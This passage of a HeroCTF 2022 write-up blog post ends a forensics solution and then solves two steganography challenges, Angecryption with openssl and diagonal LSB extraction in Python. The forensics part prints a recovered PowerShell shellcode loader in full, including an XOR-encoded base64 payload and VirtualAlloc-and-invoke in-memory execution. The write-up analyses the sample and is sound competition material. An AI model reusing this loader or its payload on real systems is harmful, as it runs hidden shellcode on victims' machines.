+        <span class="err">$</span><span class="n">var_unsafe_native_methods</span> <span class="p">=</span> <span class="p">([</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span> <span class="p">|</span> <span class="n">Where</span><span class="p">-</span><span class="n">Object</span> <span class="p">{</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">GlobalAssemblyCache</span> <span class="p">-</span><span class="n">And</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">Location</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="sc">&#39;\\&#39;</span><span class="p">)[-</span><span class="m">1</span><span class="p">].</span><span class="n">Equals</span><span class="p">(</span><span class="err">&#39;</span><span class="n">System</span><span class="p">.</span><span class="n">dll</span><span class="err">&#39;</span><span class="p">)</span> <span class="p">}).</span><span class="n">GetType</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">Win32</span><span class="p">.</span><span class="n">UnsafeNativeMethods</span><span class="err">&#39;</span><span class="p">)</span>
+        <span class="err">$</span><span class="n">var_gpa</span> <span class="p">=</span> <span class="err">$</span><span class="n">var_unsafe_native_methods</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="err">&#39;</span><span class="n">GetProcAddress</span><span class="err">&#39;</span><span class="p">,</span> <span class="p">[</span><span class="n">Type</span><span class="p">[]]</span> <span class="err">@</span><span class="p">(</span><span class="err">&#39;</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">HandleRef</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="kt">string</span><span class="err">&#39;</span><span class="p">))</span>
+        <span class="k">return</span> <span class="err">$</span><span class="n">var_gpa</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="err">$</span><span class="k">null</span><span class="p">,</span> <span class="err">@</span><span class="p">([</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">HandleRef</span><span class="p">](</span><span class="n">New</span><span class="p">-</span><span class="n">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">HandleRef</span><span class="p">((</span><span class="n">New</span><span class="p">-</span><span class="n">Object</span> <span class="n">IntPtr</span><span class="p">),</span> <span class="p">(</span><span class="err">$</span><span class="n">var_unsafe_native_methods</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="err">&#39;</span><span class="n">GetModuleHandle</span><span class="err">&#39;</span><span class="p">)).</span><span class="n">Invoke</span><span class="p">(</span><span class="err">$</span><span class="k">null</span><span class="p">,</span> <span class="err">@</span><span class="p">(</span><span class="err">$</span><span class="n">var_module</span><span class="p">)))),</span> <span class="err">$</span><span class="n">var_procedure</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="n">function</span> <span class="n">func_get_delegate_type</span> <span class="p">{</span>
+        <span class="n">Param</span> <span class="p">(</span>
+<span class="na">                [Parameter(Position = 0, Mandatory = $True)]</span> <span class="p">[</span><span class="n">Type</span><span class="p">[]]</span> <span class="err">$</span><span class="n">var_parameters</span><span class="p">,</span>
+<span class="na">                [Parameter(Position = 1)]</span> <span class="p">[</span><span class="n">Type</span><span class="p">]</span> <span class="err">$</span><span class="n">var_return_type</span> <span class="p">=</span> <span class="p">[</span><span class="n">Void</span><span class="p">]</span>
+        <span class="p">)</span>
+
+        <span class="err">$</span><span class="n">var_type_builder</span> <span class="p">=</span> <span class="p">[</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">DefineDynamicAssembly</span><span class="p">((</span><span class="n">New</span><span class="p">-</span><span class="n">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">AssemblyName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">ReflectedDelegate</span><span class="err">&#39;</span><span class="p">)),</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Emit</span><span class="p">.</span><span class="n">AssemblyBuilderAccess</span><span class="p">]::</span><span class="n">Run</span><span class="p">).</span><span class="n">DefineDynamicModule</span><span class="p">(</span><span class="err">&#39;</span><span class="n">InMemoryModule</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">$</span><span class="k">false</span><span class="p">).</span><span class="n">DefineType</span><span class="p">(</span><span class="err">&#39;</span><span class="n">MyDelegateType</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">Class</span><span class="p">,</span> <span class="n">Public</span><span class="p">,</span> <span class="n">Sealed</span><span class="p">,</span> <span class="n">AnsiClass</span><span class="p">,</span> <span class="n">AutoClass</span><span class="err">&#39;</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">MulticastDelegate</span><span class="p">])</span>
+        <span class="err">$</span><span class="n">var_type_builder</span><span class="p">.</span><span class="n">DefineConstructor</span><span class="p">(</span><span class="err">&#39;</span><span class="n">RTSpecialName</span><span class="p">,</span> <span class="n">HideBySig</span><span class="p">,</span> <span class="n">Public</span><span class="err">&#39;</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">CallingConventions</span><span class="p">]::</span><span class="n">Standard</span><span class="p">,</span> <span class="err">$</span><span class="n">var_parameters</span><span class="p">).</span><span class="n">SetImplementationFlags</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Runtime</span><span class="p">,</span> <span class="n">Managed</span><span class="err">&#39;</span><span class="p">)</span>
+        <span class="err">$</span><span class="n">var_type_builder</span><span class="p">.</span><span class="n">DefineMethod</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Invoke</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">Public</span><span class="p">,</span> <span class="n">HideBySig</span><span class="p">,</span> <span class="n">NewSlot</span><span class="p">,</span> <span class="n">Virtual</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">$</span><span class="n">var_return_type</span><span class="p">,</span> <span class="err">$</span><span class="n">var_parameters</span><span class="p">).</span><span class="n">SetImplementationFlags</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Runtime</span><span class="p">,</span> <span class="n">Managed</span><span class="err">&#39;</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="err">$</span><span class="n">var_type_builder</span><span class="p">.</span><span class="n">CreateType</span><span class="p">()</span>
+<span class="p">}</span>
+<span class="na">
+</span><span class="na">[Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">var_code</span> <span class="p">=</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="err">&#39;</span><span class="m">38</span><span class="n">uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs</span><span class="p">/</span><span class="n">IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV</span><span class="p">+</span><span class="n">S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktzIyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMdUV5ZSN0V3hxi8ltrUAG32dOMVCTD65juMUTvKT208wieaO5qo5ywyeEf9pwZKGG8TAcxE7iB58Wau94HkEUH2A9EqHVsSchnYO2f9slI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TCi4pIyP2FEKmfj3qdxD71BUHQ2y4CfT0cWDSgxQPUZ3RM14</span><span class="p">/</span><span class="n">UbAwHFOh9b3h5CVXjb</span><span class="p">/</span><span class="n">xU61Jjip1sye0ULWrlbmx1pq3bondZkMv7MbGE4X7WhcJr5bCoLyAQEfseswZDDe1lGF6MG3aPm8078xGyYHQcuBDQE99MjljeYekDUYfxH08B33TsydminGhyInO1fy2Qq2TT0XpP</span><span class="p">/</span><span class="m">1</span><span class="n">xpL5Yd</span><span class="p">+</span><span class="n">vz6lsNEWUPo9XA8tKY2FTZxdkNBNujGR2SPBehUopPNfBB</span><span class="p">+</span><span class="n">PMVWOx2BPlaLiwEIexmHgR</span><span class="p">/</span><span class="n">VbFcxWnLrxLZUqtYuhh1LyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi</span><span class="p">+</span><span class="n">nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhUSDRoUDRIVEA0RFxQjOkqDrg</span><span class="p">==</span><span class="err">&#39;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="p">(</span><span class="err">$</span><span class="n">x</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="err">$</span><span class="n">x</span> <span class="p">-</span><span class="n">lt</span> <span class="err">$</span><span class="n">var_code</span><span class="p">.</span><span class="n">Count</span><span class="p">;</span> <span class="err">$</span><span class="n">x</span><span class="p">++)</span> <span class="p">{</span>
+        <span class="err">$</span><span class="n">var_code</span><span class="p">[</span><span class="err">$</span><span class="n">x</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">var_code</span><span class="p">[</span><span class="err">$</span><span class="n">x</span><span class="p">]</span> <span class="p">-</span><span class="n">bxor</span> <span class="m">35</span>
+<span class="p">}</span>
+
+<span class="err">$</span><span class="n">var_va</span> <span class="p">=</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">func_get_proc_address</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span> <span class="n">VirtualAlloc</span><span class="p">),</span> <span class="p">(</span><span class="n">func_get_delegate_type</span> <span class="err">@</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">],</span> <span class="p">[</span><span class="n">UInt32</span><span class="p">],</span> <span class="p">[</span><span class="n">UInt32</span><span class="p">],</span> <span class="p">[</span><span class="n">UInt32</span><span class="p">])</span> <span class="p">([</span><span class="n">IntPtr</span><span class="p">])))</span>
+<span class="err">$</span><span class="n">var_buffer</span> <span class="p">=</span> <span class="err">$</span><span class="n">var_va</span><span class="p">.</span><span class="n">Invoke</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span> <span class="err">$</span><span class="n">var_code</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0</span><span class="n">x3000</span><span class="p">,</span> <span class="m">0</span><span class="n">x40</span><span class="p">)</span>
+<span class="na">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">Copy</span><span class="p">(</span><span class="err">$</span><span class="n">var_code</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="err">$</span><span class="n">var_buffer</span><span class="p">,</span> <span class="err">$</span><span class="n">var_code</span><span class="p">.</span><span class="n">length</span><span class="p">)</span>
+
+<span class="err">$</span><span class="n">var_runme</span> <span class="p">=</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="err">$</span><span class="n">var_buffer</span><span class="p">,</span> <span class="p">(</span><span class="n">func_get_delegate_type</span> <span class="err">@</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">])</span> <span class="p">([</span><span class="n">Void</span><span class="p">])))</span>
+<span class="err">$</span><span class="n">var_runme</span><span class="p">.</span><span class="n">Invoke</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">)</span>
+<span class="err">&#39;@</span>
+
+<span class="n">If</span> <span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">size</span> <span class="p">-</span><span class="n">eq</span> <span class="m">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">start</span><span class="p">-</span><span class="n">job</span> <span class="p">{</span> <span class="n">param</span><span class="p">(</span><span class="err">$</span><span class="n">a</span><span class="p">)</span> <span class="n">IEX</span> <span class="err">$</span><span class="n">a</span> <span class="p">}</span> <span class="p">-</span><span class="n">RunAs32</span> <span class="p">-</span><span class="n">Argument</span> <span class="err">$</span><span class="n">DoIt</span> <span class="p">|</span> <span class="n">wait</span><span class="p">-</span><span class="n">job</span> <span class="p">|</span> <span class="n">Receive</span><span class="p">-</span><span class="n">Job</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+        <span class="n">IEX</span> <span class="err">$</span><span class="n">DoIt</span>
+<span class="p">}</span>
+</code></pre></div><p>Now we need the first part which must be before the execution of the powershell script. If we strings <code>iexplorer64.exe</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">...</span>
+<span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">j</span><span class="p">.</span><span class="n">bertrand</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">iexplorer64</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">41AMoD4RLwE7h2REtSWSGfUFu</span>
+<span class="p">...</span>
+</code></pre></div><p><strong>41AMoD4RLwE7h2REtSWSGfUFu</strong> is the first part of the flag, base 64 encoded. Full flag :</p>
+<p><code>Hero{p3rs0n4l_3v1l_m4lw4r3_n0t_fl4g_by_d3f3nd3r}</code></p>
+<h1 id="steganography">Steganography<a hidden class="anchor" aria-hidden="true" href="#steganography">#</a></h1>
+<h2 id="ange">Ange<a hidden class="anchor" aria-hidden="true" href="#ange">#</a></h2>
+<p>The challenge name refers to a steganography technique called Angecryption, which consist to encrypt/decrypt a file to access another one. With the key and the IV given in the challenge decryption, we can try to decrypt the image:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ openssl enc -d -aes-128-cbc -in image.png -out output.png -K 7468697369736a757374
+616b65797979 -iv 6f07333c9c2352e2e3b123b2fe26a25c
+</code></pre></div><p>But it fails. Let’s ty to encrypt it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">$openssl</span> enc -aes-128-cbc -in image.png -out output.png -K 7468697369736a757374
+616b65797979 -iv 6f07333c9c2352e2e3b123b2fe26a25c
+</code></pre></div><p>It gives us a new PNG image:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%209.png" alt="Untitled"  />
+</p>
+<p>After submiting it to <a href="https://aperisolve.fr/">Aperisolve</a>, we got the flag :</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%2010.png" alt="Untitled"  />
+</p>
+<h2 id="lsd">LSD<a hidden class="anchor" aria-hidden="true" href="#lsd">#</a></h2>
+<p>LSD reminds me of the LSB technics. I submitted it to <a href="https://aperisolve.fr/">Aperisolve</a>, and there is something which looks like LSB:</p>
+<p><img loading="lazy" src="/heroctf2022/Untitled%2011.png" alt="Untitled"  />
+</p>
+<p>The LSB is stored in a diagonal, starting from <code>0,0</code> to <code>317,317</code>. With this simple script, it gives us a binary output :</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+ 
+<span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;secret.png&#34;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+<span class="n">pixels</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+<span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">size</span>
+<span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">318</span><span class="p">,</span><span class="mi">1</span><span class="p">):</span> 
+   <span class="n">red</span> <span class="o">=</span> <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+   <span class="n">green</span> <span class="o">=</span> <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
+   <span class="n">blue</span> <span class="o">=</span> <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span>
+   <span class="n">a</span> <span class="o">=</span> <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span>
+   <span class="n">binary</span> <span class="o">+=</span>  <span class="nb">bin</span><span class="p">(</span><span class="n">red</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span>  <span class="nb">bin</span><span class="p">(</span><span class="n">green</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="n">blue</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="n">a</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> 
+ 
+<span class="k">print</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+</code></pre></div><p>Once decoded from binary to ASCII, we got the flag :</p>
+<pre><code>Well done champ, you're starting to touch some real steganography. Glad you didn't just throw a random script. Here is your flag: Hero{L5B_D14G_0R1G1N4L_N0P_?}
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://luhko.github.io/write-up/404ctf/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>404 CTF 2022</span>
+  </a>
+  <a class="next" href="https://luhko.github.io/write-up/cyber2022/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Cyber Apocalypse CTF 2022</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://luhko.github.io/">Luhko</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
